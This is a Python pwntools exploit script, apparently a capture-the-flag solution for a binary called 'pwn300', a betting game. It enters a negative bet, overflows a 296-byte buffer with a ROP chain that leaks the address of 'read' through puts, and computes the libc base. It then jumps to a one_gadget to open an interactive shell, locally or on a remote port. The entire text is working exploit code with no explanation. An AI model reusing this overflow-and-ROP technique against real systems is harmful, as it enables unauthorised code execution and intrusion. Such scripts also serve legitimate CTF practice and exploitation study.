from pwn import *

DEBUG = False
LOCAL = True

BUF_SIZE = 296

GOT_READ = 0x404038
CALL_READ = 0x401070
CALL_PUTS = 0x401040

game = 0x0000000004011B2 # main function start
pop_rdi = 0x4014eb # pop rdi; ret; 

offset_one_gadget = 0xe5456

host = '0.0.0.0'
port = 6767


if __name__ == "__main__":

	libc = ELF( './libc.so' )

	if LOCAL:
		p = process( "./pwn300" )

		if DEBUG:
			gdb.attach( p )
	else:
		p = remote( host, port )

	p.recvuntil( ": " )

	# make some money
	p.send( "-10000\n" )
	p.recvuntil( ": " )

	p.send( "500\n" )

	payload = 'A' * BUF_SIZE
	payload += p64( pop_rdi )
	payload += p64( GOT_READ )
	payload += p64( CALL_PUTS )
	#payload += p64( 0x0 )
	payload += p64( game )

	p.recvuntil( "your lose bet\n" )
	p.send( payload + '\n' )
	p.recvline()

	read_leak = u64( p.recvline().strip() + '\x00\x00' )
	
	libc_base  = read_leak - libc.symbols[ 'read' ]
	one_gadget = libc_base + offset_one_gadget

	print "libc_base = 0x%x" % libc_base
	print "one_gadget = 0x%x" % one_gadget
		
	data = p.recvuntil( ": ")
	print data
	
	p.send( "500\n")

	p.recvuntil( 'your lose bet\n' )

	payload  = 'B' * BUF_SIZE
	payload += p64( one_gadget )
	payload += '\x00' * 0x70

	p.send( payload + '\n' )

	p.interactive()
